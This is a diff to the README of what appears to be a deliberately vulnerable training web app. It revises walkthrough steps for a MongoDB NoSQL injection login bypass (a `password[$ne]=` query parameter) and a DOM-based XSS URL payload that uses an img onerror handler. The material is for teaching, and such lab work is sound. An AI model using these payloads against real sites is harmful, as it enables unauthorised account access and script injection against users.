@@ -17,8 +17,9 @@
 
 Log in as any existing user.
 
--   Enter `james` as the username
--   Enter `{ "$ne": "" }` as the password
+-   Enter `http://localhost:8000/login?username=james&password[%24ne]=` into the address bar.
+
+The server will interpret that as `{ username: 'james', password: { '$ne': '' }`; the password is passed into MongoDb as a JSON object, where the criteria will always evaluate to `true`.
 
 ### DOM-Based XSS #1:
 
@@ -26,7 +27,7 @@ Log in as any existing user.
 
 ### DOM-Based XSS #2:
 
--   Enter `http://localhost:8000/dom-xss2#Christine Bui"><img src="x" onerror="function f(){alert('Malicious code executed, cookies stolen!');} f()">` into address bar.
+-   Enter `http://localhost:8000/dom-xss2#Christine Bui"><img src="x" onerror="function f(){alert('Malicious code executed, cookies stolen!');} f()">` into the address bar.
 
 # For developers
 
